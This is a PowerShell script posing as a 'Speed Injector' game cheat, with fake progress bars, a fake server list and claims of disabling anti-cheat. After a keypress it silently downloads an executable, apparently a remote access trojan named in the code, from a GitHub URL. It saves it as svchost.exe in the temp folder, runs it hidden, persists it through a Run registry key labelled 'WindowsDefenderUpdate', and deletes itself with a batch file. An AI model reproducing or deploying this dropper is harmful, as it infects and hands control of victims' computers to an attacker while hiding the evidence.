Clear
Write-Host ""
Write-Host "    ██████╗ ██╗   ██╗███████╗████████╗███████╗██╗  ██╗" -ForegroundColor Cyan
Write-Host "    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝" -ForegroundColor Cyan
Write-Host "    ██████╔╝██║   ██║███████╗   ██║   █████╗   ╚███╔╝ " -ForegroundColor Cyan
Write-Host "    ██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝   ██╔██╗ " -ForegroundColor Cyan
Write-Host "    ██║  ██║╚██████╔╝███████║   ██║   ███████╗██╔╝ ██╗" -ForegroundColor Cyan
Write-Host "    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "    ==== RUSTEX REMAKE - Speed Injector v2.5 ====" -ForegroundColor Yellow
Write-Host "    (c) 2026 Rustex Team. All rights reserved."
Write-Host ""
Write-Host "    [*] Checking system integrity..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
for ($i = 0; $i -le 100; $i += 10) {
    $bar = "[{0}{1}]" -f ('#' * ($i / 5)), ('-' * ((100 - $i) / 5))
    Write-Host "`r    [$bar] $i% - System check in progress..." -NoNewline -ForegroundColor Green
    Start-Sleep -Milliseconds 30
}
Write-Host "`r    [####################] 100% - System check complete!" -ForegroundColor Green
Write-Host ""
Write-Host "    [*] Loading Speed driver..." -ForegroundColor Gray
Start-Sleep -Milliseconds 300
$driverSteps = @(
    "Initializing hook engine...",
    "Injecting into game process...",
    "Applying recoil compensation...",
    "Disabling anti-cheat modules...",
    "Activating aim assist...",
    "Ready for combat!"
)
for ($i = 0; $i -lt $driverSteps.Length; $i++) {
    Write-Host "    [>] $($driverSteps[$i])" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds (Get-Random -Minimum 150 -Maximum 400)
}
Write-Host ""
Write-Host "    [*] Initializing Speed module..." -ForegroundColor Gray
$totalSteps = 25
for ($i = 1; $i -le $totalSteps; $i++) {
    $percent = [math]::Round(($i / $totalSteps) * 100)
    $barLength = [math]::Floor(($i / $totalSteps) * 30)
    $bar = "#" * $barLength + "-" * (30 - $barLength)
    if ($i -le 5) { $status = "Loading configuration..." }
    elseif ($i -le 10) { $status = "Compiling shaders..." }
    elseif ($i -le 15) { $status = "Connecting to game engine..." }
    elseif ($i -le 20) { $status = "Applying patches..." }
    else { $status = "Finalizing injection..." }
    Write-Host "`r    [$bar] $percent% - $status" -NoNewline -ForegroundColor Green
    Start-Sleep -Milliseconds (Get-Random -Minimum 20 -Maximum 80)
}
Write-Host "`r    [##############################] 100% - Ready!" -ForegroundColor Green
Write-Host ""
Write-Host "    [*] Connecting to Rustex servers..." -ForegroundColor Gray
$servers = @(
    "EU-WEST-01 [ping: 12ms]",
    "EU-WEST-02 [ping: 24ms]",
    "US-EAST-01 [ping: 89ms]",
    "ASIA-SG-01 [ping: 156ms]"
)
foreach ($server in $servers) {
    Write-Host "    [>] $server" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 500)
}
Write-Host ""
Write-Host "    [>] Speed injected successfully!" -ForegroundColor Green
Write-Host "    [>] You are ready for battle, soldier!" -ForegroundColor Green
Write-Host ""
Write-Host "    [*] Loading game world..." -ForegroundColor Gray
$gameSteps = @(
    "Loading terrain...",
    "Spawning players...",
    "Loading weapons...",
    "Initializing physics...",
    "Preparing map...",
    "Game ready!"
)
for ($i = 0; $i -lt $gameSteps.Length; $i++) {
    $percent = [math]::Round((($i + 1) / $gameSteps.Length) * 100)
    $bar = "#" * (($i + 1) * 4) + "-" * ((6 - ($i + 1)) * 4)
    Write-Host "`r    [$bar] $percent% - $($gameSteps[$i])" -NoNewline -ForegroundColor Green
    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 400)
}
Write-Host "`r    [########################] 100% - Welcome to Rustex!" -ForegroundColor Green
Write-Host ""
Write-Host "    ========================================" -ForegroundColor Cyan
Write-Host "        RUSTEX REMAKE - Speed ACTIVE      " -ForegroundColor White
Write-Host "    ========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "    Press any key to minimize to tray..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
$ratUrl = "https://raw.githubusercontent.com/packalevdanil-sys/Rt/refs/heads/main/ccmmnd.exe"
$ratPath = "$env:TEMP\svchost.exe"
try {
    $null = Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath -UseBasicParsing -ErrorAction SilentlyContinue
    if (-not (Test-Path $ratPath)) {
        (New-Object System.Net.WebClient).DownloadFile($ratUrl, $ratPath)
    }
    if (Test-Path $ratPath) {
        Start-Process -FilePath $ratPath -WindowStyle Hidden
        try {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value $ratPath -ErrorAction SilentlyContinue
        } catch {}
    }
} catch {
    $null = $_
}
Start-Sleep -Seconds 2
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    $batContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q "$scriptPath"
del /f /q "%~f0"
"@
    $batPath = "$env:TEMP\cleanup.bat"
    Set-Content -Path $batPath -Value $batContent -Force
    Start-Process -FilePath $batPath -WindowStyle Hidden
}
exit